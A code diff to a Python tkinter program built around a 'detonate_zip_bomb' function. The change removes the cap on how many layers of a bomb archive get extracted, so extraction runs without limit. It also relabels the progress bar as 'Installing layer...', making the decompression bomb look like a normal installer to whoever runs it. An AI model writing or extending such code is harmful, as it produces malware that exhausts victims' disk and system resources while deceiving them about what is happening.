@@ -7,9 +7,9 @@ from tkinter import ttk
 import shutil
 import sys
 
-def extract_all_recursive(base_dir, max_layers):
-    global layer_progress
-    for _ in range(max_layers):
+def extract_all_recursive(base_dir):
+    layer = 0
+    while True:
         found = False
         for root, dirs, files in os.walk(base_dir):
             for file in files:
@@ -25,19 +25,19 @@ def extract_all_recursive(base_dir, max_layers):
                         pass
         if not found:
             break
-        layer_progress += 1
-        update_layer_progress(layer_progress, max_layers)
+        layer += 1
+        update_layer_progress(layer)
 
-def update_layer_progress(current, total):
-    percent = int((current / total) * 100)
+def update_layer_progress(current):
+    percent = min(current * 20, 100)  # assumes ~5 layers max
     bar["value"] = percent
-    label_var.set(f"Installing layer {current} of {total}...")
+    label_var.set(f"Installing layer {current}...")
     root.update_idletasks()
 
 def detonate_zip_bomb():
     os.makedirs("bomb_detonated", exist_ok=True)
     shutil.copy(bomb_filename, f"bomb_detonated/{bomb_filename}")
-    extract_all_recursive("bomb_detonated", max_layers)
+    extract_all_recursive("bomb_detonated")
 
 def run_gui():
     global root, bar, label_var
